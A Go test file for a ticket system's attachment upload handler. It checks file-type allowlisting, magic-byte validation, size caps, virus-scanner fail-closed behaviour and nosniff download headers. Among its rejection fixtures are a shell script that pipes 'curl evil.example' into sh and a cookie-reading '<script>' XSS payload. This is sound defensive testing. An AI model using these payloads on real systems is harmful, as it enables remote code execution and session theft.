package handlers

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"net/http/httptest"
	"net/textproto"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"testing"

	"dylaris-core/models"
	"dylaris-core/storage"
	"dylaris-core/store"

	"github.com/gorilla/mux"
)

// attachmentUploadFakeStore is a minimal store.Store fake covering exactly
// the methods UploadAttachment's call graph touches (loadTicketAndGate,
// LoadEffectivePermissions, LoadTicketSettings, the three quota checks,
// AddTicketAttachment, InsertTicketAudit). Distinct from gateFakeStore /
// coreStorageFakeStore (they don't implement GetTicket/AddTicketAttachment)
// and from any other fake in this package.
type attachmentUploadFakeStore struct {
	store.Store
	settings map[string]string
	ticket   *models.Ticket

	addErr      error
	attachments []*models.TicketAttachment // rows actually persisted
	auditEvents int
}

func (f *attachmentUploadFakeStore) GetSetting(key string) (string, error) {
	return f.settings[key], nil
}
func (f *attachmentUploadFakeStore) GetTicket(id int) (*models.Ticket, error) {
	if f.ticket == nil || f.ticket.ID != id {
		return nil, nil
	}
	return f.ticket, nil
}
func (f *attachmentUploadFakeStore) GetUserByID(id string) (*models.User, error) { return nil, nil }
func (f *attachmentUploadFakeStore) GetUserRegionIDs(id string) ([]string, error) {
	return nil, nil
}
func (f *attachmentUploadFakeStore) IsTicketWatcher(ticketID int, userID string) (bool, error) {
	return false, nil
}
func (f *attachmentUploadFakeStore) ListTicketWatchers(ticketID int) ([]models.TicketWatcher, error) {
	return nil, nil
}
func (f *attachmentUploadFakeStore) SumAttachmentBytesByTicket(ticketID int) (int64, error) {
	return 0, nil
}
func (f *attachmentUploadFakeStore) SumAttachmentBytesByUser(userID string) (int64, error) {
	return 0, nil
}
func (f *attachmentUploadFakeStore) AddTicketAttachment(a *models.TicketAttachment) (int, error) {
	if f.addErr != nil {
		return 0, f.addErr
	}
	f.attachments = append(f.attachments, a)
	return len(f.attachments), nil
}
func (f *attachmentUploadFakeStore) InsertTicketAudit(ev *models.TicketAuditEvent) error {
	f.auditEvents++
	return nil
}
func (f *attachmentUploadFakeStore) GetTicketAttachment(id int) (*models.TicketAttachment, error) {
	for _, a := range f.attachments {
		if a.ID == id {
			return a, nil
		}
	}
	return nil, nil
}

// recordingScanner counts invocations and records the exact bytes it was
// asked to scan, so a test can assert both "was it called" and "did it see
// the whole file" without needing a real clamd.
type recordingScanner struct {
	err   error
	calls int
	seen  []byte
}

func (s *recordingScanner) Scan(r io.Reader) error {
	s.calls++
	b, _ := io.ReadAll(r)
	s.seen = b
	return s.err
}

const testTicketOwner = "owner-1"

// newAttachmentUploadHandler builds a TicketAttachmentsHandler wired directly
// (bypassing NewTicketAttachmentsHandler/env-based newAttachmentScanner) so
// each test controls the provider and scanner explicitly.
func newAttachmentUploadHandler(t *testing.T, settings map[string]string, scanner AttachmentScanner) (*TicketAttachmentsHandler, *attachmentUploadFakeStore, string) {
	t.Helper()
	dir := t.TempDir()
	fs := &attachmentUploadFakeStore{
		settings: settings,
		ticket:   &models.Ticket{ID: 1, UserID: testTicketOwner},
	}
	st := &AppState{Store: fs}
	h := &TicketAttachmentsHandler{
		state:    st,
		provider: &storage.LocalProvider{BasePath: dir},
		scanner:  scanner,
	}
	return h, fs, dir
}

// newAttachmentUploadRequest builds a multipart POST with a single "file"
// part whose Content-Type header is set to declaredMIME verbatim (unlike
// multipart.Writer.CreateFormFile, which always hardcodes
// application/octet-stream) so tests can control the declared MIME
// independently of the actual byte content.
func newAttachmentUploadRequest(t *testing.T, filename, declaredMIME string, content []byte) *http.Request {
	t.Helper()
	body := &bytes.Buffer{}
	mw := multipart.NewWriter(body)
	h := textproto.MIMEHeader{}
	h.Set("Content-Disposition", fmt.Sprintf(`form-data; name="file"; filename="%s"`, filename))
	if declaredMIME != "" {
		h.Set("Content-Type", declaredMIME)
	}
	part, err := mw.CreatePart(h)
	if err != nil {
		t.Fatalf("CreatePart: %v", err)
	}
	if _, err := part.Write(content); err != nil {
		t.Fatalf("part.Write: %v", err)
	}
	if err := mw.Close(); err != nil {
		t.Fatalf("mw.Close: %v", err)
	}

	req := httptest.NewRequest(http.MethodPost, "/api/tickets/1/attachments", body)
	req.Header.Set("Content-Type", mw.FormDataContentType())
	req = req.WithContext(context.WithValue(req.Context(), "userID", testTicketOwner))
	req = mux.SetURLVars(req, map[string]string{"id": "1"})
	return req
}

// countStoredFiles walks dir and returns how many regular files exist -
// used to assert "no residue" (a rejected upload must leave the provider's
// backing store untouched).
func countStoredFiles(t *testing.T, dir string) int {
	t.Helper()
	n := 0
	err := filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.IsDir() {
			n++
		}
		return nil
	})
	if err != nil {
		t.Fatalf("walk %s: %v", dir, err)
	}
	return n
}

func pngBytes(padTo int) []byte {
	sig := []byte{0x89, 'P', 'N', 'G', 0x0D, 0x0A, 0x1A, 0x0A}
	if padTo <= len(sig) {
		return sig
	}
	out := make([]byte, padTo)
	copy(out, sig)
	// Fill the rest with varying non-zero bytes so a truncation bug (e.g.
	// dropping the first or last 512 bytes) changes the content instead of
	// leaving it looking accidentally correct.
	for i := len(sig); i < len(out); i++ {
		out[i] = byte(i % 251)
	}
	return out
}

// ustarHeaderBytes builds a genuinely-shaped 512-byte POSIX ustar header
// block: an ASCII filename in the name field (offset 0) and the real
// "ustar\000" magic at its fixed offset (257) - what attachmentAllowed's
// .tar check actually looks for. Go's DetectContentType has no tar
// signature, so this (like a real tar file) sniffs as
// application/octet-stream; only the ustar magic at offset 257 tells it
// apart from an ELF/PE payload padded to the same length.
func ustarHeaderBytes(name string) []byte {
	b := make([]byte, 512)
	copy(b, name)
	copy(b[257:], "ustar\x0000")
	return b
}

// TestUploadAttachment_AcceptedTypes covers the default allowlist end to end
// through the real handler: each case's declared MIME and byte content agree
// with what the extension permits, so every one must be stored successfully.
func TestUploadAttachment_AcceptedTypes(t *testing.T) {
	gifBytes := []byte("GIF89a" + strings.Repeat("x", 20))
	webpBytes := append([]byte("RIFF\x00\x00\x00\x00WEBPVP"), []byte("filler")...)
	jpegBytes := []byte{0xFF, 0xD8, 0xFF, 0xE0}
	pdfBytes := []byte("%PDF-1.7\n%some pdf content\n")
	zipBytes := []byte("PK\x03\x04" + strings.Repeat("z", 20))
	gzBytes := []byte{0x1F, 0x8B, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00}
	// Genuine ustar header block (see ustarHeaderBytes) - the .tar check
	// requires the real "ustar" magic at offset 257 since Fix 1 (a bare
	// NUL-padded blob with no magic, or an ELF/PE padded to the same length,
	// must now be rejected - see TestUploadAttachment_RejectedTypes).
	tarBytes := ustarHeaderBytes("myfile.txt")
	jsonBytes := []byte(`{"key":"value"}`)

	cases := []struct {
		name     string
		filename string
		declared string
		content  []byte
	}{
		{"png", "logo.png", "image/png", pngBytes(600)},
		{"jpg", "photo.jpg", "image/jpeg", jpegBytes},
		{"jpeg", "photo.jpeg", "image/jpeg", jpegBytes},
		{"gif", "anim.gif", "image/gif", gifBytes},
		{"webp", "pic.webp", "image/webp", webpBytes},
		{"pdf", "report.pdf", "application/pdf", pdfBytes},
		{"txt", "notes.txt", "text/plain", []byte("hello world\n")},
		{"log", "server.log", "text/plain", []byte("2026-07-18 boot ok\n")},
		{"json", "data.json", "application/json", jsonBytes},
		{"zip", "bundle.zip", "application/zip", zipBytes},
		{"gz", "bundle.tar.gz", "application/gzip", gzBytes},
		{"tar", "bundle.tar", "application/x-tar", tarBytes},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			h, fs, _ := newAttachmentUploadHandler(t, nil, nil)
			rw := httptest.NewRecorder()
			h.UploadAttachment(rw, newAttachmentUploadRequest(t, c.filename, c.declared, c.content))
			if rw.Code != http.StatusOK {
				t.Fatalf("status = %d, want 200 (%s)", rw.Code, rw.Body.String())
			}
			if len(fs.attachments) != 1 {
				t.Fatalf("attachments persisted = %d, want 1", len(fs.attachments))
			}
		})
	}
}

// TestUploadAttachment_RejectedTypes covers the reject paths: a disallowed
// extension, an extension-vs-sniff mismatch, and an executable/script
// disguised under an allowed extension - including the adversarial gaps Fix
// 1/2 closed (an ELF or shell script previously slipping through the loose
// text/application families, and an HTML body riding in under a .txt name).
// Every case must both come back 415 AND leave no stored object / no DB row
// behind.
func TestUploadAttachment_RejectedTypes(t *testing.T) {
	elfBytes := []byte{0x7f, 'E', 'L', 'F', 0x02, 0x01, 0x01, 0x00}
	// ELF padded to a full 512 bytes with zero bytes (no ustar magic at
	// offset 257) - proves the .tar rejection comes from the missing magic,
	// not merely from the payload being short.
	elfPadded512 := append(append([]byte{}, elfBytes...), make([]byte, 512-len(elfBytes))...)
	shellScript := []byte("#!/bin/sh\ncurl evil.example | sh\n")
	notGzip := []byte("this is not a gzip file at all, just plain text\n")
	htmlScript := []byte("<script>alert(document.cookie)</script>")
	png := pngBytes(600)

	cases := []struct {
		name     string
		filename string
		declared string
		content  []byte
	}{
		{"disallowed extension (.exe)", "totally-a-photo.exe", "application/octet-stream", elfBytes},
		{"disallowed extension (.sh) despite image header", "evil.sh", "image/png", png},
		{"extension-vs-sniff mismatch: .png named, ELF bytes", "sneaky.png", "image/png", elfBytes},
		{"script disguised as .jpg", "vacation.jpg", "image/jpeg", shellScript},
		{"no extension", "README", "text/plain", []byte("hi\n")},
		// Fix 1: family "text" (.txt/.log/.json) no longer accepts the
		// application/octet-stream fallback, so a raw ELF payload sniffing
		// as octet-stream is rejected under every text-family extension.
		{"ELF disguised as .txt", "payload.txt", "text/plain", elfBytes},
		{"ELF disguised as .log", "payload.log", "text/plain", elfBytes},
		{"ELF disguised as .json", "payload.json", "application/json", elfBytes},
		// Fix 1: .tar now requires the real ustar magic, not just an
		// application/* sniff (which octet-stream satisfies too).
		{"ELF disguised as .tar", "payload.tar", "application/x-tar", elfPadded512},
		// Fix 1: .gz now requires the real gzip magic bytes, not a loose
		// application/*-or-text/plain sniff.
		{"shell script disguised as .gz", "payload.gz", "application/gzip", shellScript},
		{"non-gzip body rejected as .gz (fails the magic check)", "payload.gz", "application/gzip", notGzip},
		// Fix 2: family "text" also excludes text/html now, so an HTML/script
		// body cannot ride in under a harmless .txt filename and later be
		// reflected as Content-Type: text/html on download.
		{"HTML/script body disguised as .txt", "notes.txt", "text/html", htmlScript},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			h, fs, dir := newAttachmentUploadHandler(t, nil, nil)
			rw := httptest.NewRecorder()
			h.UploadAttachment(rw, newAttachmentUploadRequest(t, c.filename, c.declared, c.content))
			if rw.Code != http.StatusUnsupportedMediaType {
				t.Fatalf("status = %d, want 415 (%s)", rw.Code, rw.Body.String())
			}
			if len(fs.attachments) != 0 {
				t.Fatalf("attachments persisted = %d, want 0 (no DB row on reject)", len(fs.attachments))
			}
			if n := countStoredFiles(t, dir); n != 0 {
				t.Fatalf("stored files = %d, want 0 (no residue on reject)", n)
			}
		})
	}
}

// TestUploadAttachment_ByteIntegrity is the core anti-regression test for
// the sniff-peek: reading the first 512 bytes to sniff the content type must
// NOT remove those bytes from what ultimately lands in storage. Content is
// deliberately larger than the 512-byte sniff window so a truncation bug at
// either boundary changes the stored bytes.
func TestUploadAttachment_ByteIntegrity(t *testing.T) {
	content := pngBytes(10_000)
	h, fs, _ := newAttachmentUploadHandler(t, nil, nil)
	rw := httptest.NewRecorder()
	h.UploadAttachment(rw, newAttachmentUploadRequest(t, "logo.png", "image/png", content))
	if rw.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200 (%s)", rw.Code, rw.Body.String())
	}
	if len(fs.attachments) != 1 {
		t.Fatalf("attachments persisted = %d, want 1", len(fs.attachments))
	}
	storageKey := fs.attachments[0].StorageKey

	rc, err := h.provider.GetFile(storageKey)
	if err != nil {
		t.Fatalf("GetFile(%q): %v", storageKey, err)
	}
	defer rc.Close()
	got, err := io.ReadAll(rc)
	if err != nil {
		t.Fatalf("ReadAll: %v", err)
	}
	if !bytes.Equal(got, content) {
		t.Fatalf("stored content mismatch: got %d bytes, want %d bytes (len equal=%v)", len(got), len(content), len(got) == len(content))
	}
}

// TestUploadAttachment_SizeCapsStillEnforced pins that the pre-existing
// per-file quota check still runs and still blocks BEFORE the new MIME/scan
// gate - the new code was inserted after the quota checks, not instead of
// them.
func TestUploadAttachment_SizeCapsStillEnforced(t *testing.T) {
	h, fs, dir := newAttachmentUploadHandler(t, map[string]string{
		"tickets.max_file_size_mb": "1", // caps to 1 MiB
	}, nil)
	oversized := make([]byte, 2*1024*1024)
	copy(oversized, []byte{0x89, 'P', 'N', 'G', 0x0D, 0x0A, 0x1A, 0x0A})

	rw := httptest.NewRecorder()
	h.UploadAttachment(rw, newAttachmentUploadRequest(t, "big.png", "image/png", oversized))
	if rw.Code != http.StatusRequestEntityTooLarge {
		t.Fatalf("status = %d, want 413 (%s)", rw.Code, rw.Body.String())
	}
	if len(fs.attachments) != 0 {
		t.Fatalf("attachments persisted = %d, want 0", len(fs.attachments))
	}
	if n := countStoredFiles(t, dir); n != 0 {
		t.Fatalf("stored files = %d, want 0", n)
	}
}

// TestUploadAttachment_ScannerDisabledByDefault asserts the off-by-default
// contract at the handler level: with h.scanner == nil (what
// NewTicketAttachmentsHandler wires when CLAMAV_ADDR is unset), a valid
// upload succeeds without anything resembling a scan step running.
func TestUploadAttachment_ScannerDisabledByDefault(t *testing.T) {
	h, fs, _ := newAttachmentUploadHandler(t, nil, nil) // scanner: nil
	if h.scanner != nil {
		t.Fatal("test setup error: scanner must be nil")
	}
	rw := httptest.NewRecorder()
	h.UploadAttachment(rw, newAttachmentUploadRequest(t, "logo.png", "image/png", pngBytes(600)))
	if rw.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200 (%s)", rw.Code, rw.Body.String())
	}
	if len(fs.attachments) != 1 {
		t.Fatalf("attachments persisted = %d, want 1", len(fs.attachments))
	}
}

// TestUploadAttachment_ScannerEnabledClean asserts that when a scanner IS
// configured and reports no hit, the scanner is actually invoked (with the
// full file content) and the upload proceeds to storage.
func TestUploadAttachment_ScannerEnabledClean(t *testing.T) {
	scanner := &recordingScanner{err: nil}
	h, fs, _ := newAttachmentUploadHandler(t, nil, scanner)
	content := pngBytes(2000)

	rw := httptest.NewRecorder()
	h.UploadAttachment(rw, newAttachmentUploadRequest(t, "logo.png", "image/png", content))
	if rw.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200 (%s)", rw.Code, rw.Body.String())
	}
	if scanner.calls != 1 {
		t.Fatalf("scanner.calls = %d, want 1", scanner.calls)
	}
	if !bytes.Equal(scanner.seen, content) {
		t.Fatalf("scanner saw %d bytes, want the full %d-byte upload", len(scanner.seen), len(content))
	}
	if len(fs.attachments) != 1 {
		t.Fatalf("attachments persisted = %d, want 1", len(fs.attachments))
	}
}

// TestUploadAttachment_ScannerEnabledHit asserts a scanner-reported virus
// hit rejects the upload with 415 and leaves no stored object / no DB row.
// The scanner wraps errScanHit, exactly as clamdScanner does on a real
// "FOUND" reply - this is what UploadAttachment uses (via errors.Is) to tell
// a genuine hit apart from an infrastructure failure (see the
// InfraErrorFailsClosed test below, which must return 503 instead).
func TestUploadAttachment_ScannerEnabledHit(t *testing.T) {
	scanner := &recordingScanner{err: fmt.Errorf("%w: Eicar-Test-Signature FOUND", errScanHit)}
	h, fs, dir := newAttachmentUploadHandler(t, nil, scanner)

	rw := httptest.NewRecorder()
	h.UploadAttachment(rw, newAttachmentUploadRequest(t, "logo.png", "image/png", pngBytes(600)))
	if rw.Code != http.StatusUnsupportedMediaType {
		t.Fatalf("status = %d, want 415 (%s)", rw.Code, rw.Body.String())
	}
	if scanner.calls != 1 {
		t.Fatalf("scanner.calls = %d, want 1", scanner.calls)
	}
	if len(fs.attachments) != 0 {
		t.Fatalf("attachments persisted = %d, want 0", len(fs.attachments))
	}
	if n := countStoredFiles(t, dir); n != 0 {
		t.Fatalf("stored files = %d, want 0 (nothing must land in storage on a scan hit)", n)
	}
}

// TestUploadAttachment_ScannerEnabledInfraErrorFailsClosed pins the explicit
// fail-closed decision (task-7-report.md): when scanning is enabled but the
// scanner itself errors out (e.g. clamd unreachable) rather than reporting a
// clean/infected verdict, the upload must still be REJECTED, not silently
// let through unscanned - but as a distinct HTTP status (503, a server-side
// condition) from a genuine hit (415, a client-content problem), and the
// response body must be a fixed generic message that does NOT leak the raw
// scanner error (which here contains an internal host:port). This is
// deliberately a distinct test from the "hit" case above even though the
// upload is rejected in both, so both the status split and the info-leak fix
// are pinned by name and cannot regress silently.
func TestUploadAttachment_ScannerEnabledInfraErrorFailsClosed(t *testing.T) {
	const internalAddr = "10.0.0.7:3310"
	scanner := &recordingScanner{err: fmt.Errorf("clamav dial: dial tcp %s: connect: connection refused", internalAddr)}
	h, fs, dir := newAttachmentUploadHandler(t, nil, scanner)

	rw := httptest.NewRecorder()
	h.UploadAttachment(rw, newAttachmentUploadRequest(t, "logo.png", "image/png", pngBytes(600)))
	if rw.Code != http.StatusServiceUnavailable {
		t.Fatalf("status = %d, want 503 (fail-closed on scanner infra error, server-side status) (%s)", rw.Code, rw.Body.String())
	}
	if strings.Contains(rw.Body.String(), internalAddr) {
		t.Fatalf("response body leaks the internal scanner address: %s", rw.Body.String())
	}
	if strings.Contains(rw.Body.String(), "connection refused") {
		t.Fatalf("response body leaks the raw scanner error: %s", rw.Body.String())
	}
	if len(fs.attachments) != 0 {
		t.Fatalf("attachments persisted = %d, want 0", len(fs.attachments))
	}
	if n := countStoredFiles(t, dir); n != 0 {
		t.Fatalf("stored files = %d, want 0", n)
	}
}

// TestUploadAttachment_StoredMimeIsSniffedNotDeclared pins Fix 2: the
// persisted Mime is always what http.DetectContentType actually saw, never
// the client's declared Content-Type header. Uploads a real PNG while
// declaring text/html (the exact shape of the reported gap: a client can
// claim any Content-Type it likes) and asserts the stored Mime is the
// sniffed image type, not the declared one.
func TestUploadAttachment_StoredMimeIsSniffedNotDeclared(t *testing.T) {
	h, fs, _ := newAttachmentUploadHandler(t, nil, nil)
	rw := httptest.NewRecorder()
	h.UploadAttachment(rw, newAttachmentUploadRequest(t, "logo.png", "text/html", pngBytes(600)))
	if rw.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200 (%s)", rw.Code, rw.Body.String())
	}
	if len(fs.attachments) != 1 {
		t.Fatalf("attachments persisted = %d, want 1", len(fs.attachments))
	}
	if got := fs.attachments[0].Mime; !strings.HasPrefix(got, "image/") {
		t.Fatalf("stored Mime = %q, want the sniffed image/* type - the declared text/html must never be persisted", got)
	}
}

// TestDownloadAttachment_NoSniffHeader pins Fix 2's second half: the download
// response always carries X-Content-Type-Options: nosniff, so a browser
// cannot content-sniff a stored file into something more dangerous than its
// (now sniff-derived) Content-Type - defence in depth alongside
// Content-Disposition: attachment.
func TestDownloadAttachment_NoSniffHeader(t *testing.T) {
	h, fs, _ := newAttachmentUploadHandler(t, nil, nil)
	uploadRW := httptest.NewRecorder()
	h.UploadAttachment(uploadRW, newAttachmentUploadRequest(t, "logo.png", "image/png", pngBytes(600)))
	if uploadRW.Code != http.StatusOK {
		t.Fatalf("upload status = %d, want 200 (%s)", uploadRW.Code, uploadRW.Body.String())
	}
	if len(fs.attachments) != 1 {
		t.Fatalf("attachments persisted = %d, want 1", len(fs.attachments))
	}
	aid := fs.attachments[0].ID

	req := httptest.NewRequest(http.MethodGet, fmt.Sprintf("/api/tickets/1/attachments/%d/download", aid), nil)
	req = req.WithContext(context.WithValue(req.Context(), "userID", testTicketOwner))
	req = mux.SetURLVars(req, map[string]string{"id": "1", "aid": strconv.Itoa(aid)})

	rw := httptest.NewRecorder()
	h.DownloadAttachment(rw, req)
	if rw.Code != http.StatusOK {
		t.Fatalf("download status = %d, want 200 (%s)", rw.Code, rw.Body.String())
	}
	if got := rw.Header().Get("X-Content-Type-Options"); got != "nosniff" {
		t.Fatalf("X-Content-Type-Options = %q, want %q", got, "nosniff")
	}
}

// seekAssertingProvider is a StorageProvider fake whose WriteFile records
// only whether the reader IT WAS HANDED implements io.Seeker - it never
// needs to actually persist anything for this regression guard. Embeds the
// interface (left nil) so any other method is never expected to be called
// during UploadAttachment; calling one would panic loudly rather than
// silently succeed.
type seekAssertingProvider struct {
	storage.StorageProvider
	called   bool
	seekable bool
}

func (p *seekAssertingProvider) WriteFile(path string, content io.Reader) error {
	p.called = true
	_, p.seekable = content.(io.Seeker)
	return nil
}

// TestUploadAttachment_WriteFileReceivesSeekableReader is the Fix 1
// regression guard: S3Provider.WriteFile (core/storage/s3provider.go) passes
// its reader straight through to the AWS SDK's PutObject with no content
// length. The SDK's checksum middleware refuses an unseekable stream outright
// on a plain-HTTP endpoint - exactly the documented self-hosted MinIO use
// case (http://minio:9000) - so UploadAttachment must hand WriteFile
// something seekable (the multipart.File itself, rewound after the sniff
// peek), never an io.MultiReader stitched from the peeked head plus the rest
// of the stream.
func TestUploadAttachment_WriteFileReceivesSeekableReader(t *testing.T) {
	fp := &seekAssertingProvider{}
	fs := &attachmentUploadFakeStore{ticket: &models.Ticket{ID: 1, UserID: testTicketOwner}}
	h := &TicketAttachmentsHandler{state: &AppState{Store: fs}, provider: fp}

	rw := httptest.NewRecorder()
	h.UploadAttachment(rw, newAttachmentUploadRequest(t, "logo.png", "image/png", pngBytes(2000)))
	if rw.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200 (%s)", rw.Code, rw.Body.String())
	}
	if !fp.called {
		t.Fatal("provider.WriteFile was never called")
	}
	if !fp.seekable {
		t.Fatal("provider.WriteFile received a reader that does not implement io.Seeker - S3Provider.WriteFile passes it straight to PutObject with no content length, and the AWS SDK's checksum middleware refuses an unseekable stream on a plain-HTTP endpoint (e.g. self-hosted MinIO)")
	}
}
